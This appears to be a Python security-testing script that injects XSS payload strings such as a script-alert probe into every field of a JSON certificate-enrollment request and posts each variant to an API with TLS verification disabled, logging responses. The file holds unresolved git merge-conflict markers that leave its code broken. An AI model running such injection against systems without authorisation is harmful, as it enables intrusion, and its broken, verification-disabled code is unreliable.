'''
Set Up:
    ::python2 or python 3(preferred) flavor of  (miniconda) installed
Usage:
    ::mal_file -> a file name containing malicious strings: 'xss.txt'
                  OR
               -> a list of values haing malicious strings : ["alert}>'><script>alert(<fin2000>)</script>", "<script>alert(<fin2000>)</script>", ...]
               Each malicious string is set for all the keys in the json structure and posted

Dependency: UtilsLib.py in the same directory as that of script
'''
from requests.exceptions import ConnectionError

from  UtilsLibFuzzing import Utils
import time
import requests
import sys
#####################################################################
requests.packages.urllib3.disable_warnings()  # supress https warnings
######################################################################
a = [{
      "partnerOrderId": "xxxxxx",
    "productType": "hujhuuu",
    "csr": "dgdghdfh",
    "serverType": "Apache",
    "validityPeriodDays": 365,
    "authType": "DNS",
    "domain": {
      "cn": "sfs.net",
      "sans": None
               },
    "org": {
      "orgName": "$xxxxxx$",
      "orgUnit": "Eng",
      "address": {
        "addressLine1": "4201 norwalk dr1",
        "addressLine2": "",
        "addressLine3": "",
        "phoneNumber": "",
        "city": "san jose",
        "state": "$california$",
        "country": "us",
<<<<<<< HEAD
        "zip": "95129"}

=======
        "zip": "$95129$"
      }
>>>>>>> 4bed55afc435bd5e53cb3e6c3f7892c73bb69355
      }
     


  ,
       "certTransparency":{
        "ctLogging":False
     },

    "signatureAlgorithm": "sha256WithRSAEncryption",
    "certChainType": "MIXED",
    "locale": None
  }
]
######################################################################
u = Utils()  # create instance
#######################################################################
authType = 'Basic '
auth_token = 'ssgsgsgsdhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh'
api_url_enroll = 'https://xxxxxx.net/ssl/v1/enroll'
#mal_file = ["alert}>'><script>alert(<fin2000>)</script>"]
mal_file = ['xss.txt']
########################################################################
time_i = str(time.ctime()).replace(' ', '-').replace(':', '-')
enroll_fail_file = 'Enroll_Fail_' + time_i + '.txt'
enroll_pass_file = enroll_fail_file.replace('Fail', 'Pass')
network_issues_file = enroll_fail_file.replace('Fail', 'network_issues')

open(enroll_fail_file, 'w').close()  # create the files if does not exist
open(enroll_pass_file, 'w').close()  # create teh file if does not exist
open(network_issues_file, 'w').close()
import socks, socket

if False:
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 8899)
    socket.socket = socks.socksocket
########################################################################
<<<<<<< HEAD

print('hi')
for postdata in u.generator_with_insecure_values_POST_req(a, mal_file):
=======
counter = 0
for postdata, mal_string, key in u.generator_with_insecure_values_POST_req(a, mal_file):
>>>>>>> 4bed55afc435bd5e53cb3e6c3f7892c73bb69355
    counter+=1
    print(postdata, counter)
    try:
        resp = requests.post(api_url_enroll,
                             json=postdata,
                             verify=False,
                             headers={'Authorization': authType + auth_token})

        if resp.status_code in [200, 201]:
            outputfile = enroll_pass_file
        else:
            outputfile = enroll_fail_file
        print(resp.status_code)

        u.write_details_to_file_ee(outputfile,
                                  
                                   'POST response : Here is output::'+ resp.text,
                                   'Status Code::' + str(resp.status_code),
                                   '=END=' * 5)
    except ConnectionError:
        print('-' * 20 )
        print('----Connection Issues---')
        print('-' * 20 )
        #sys.exit(-1)
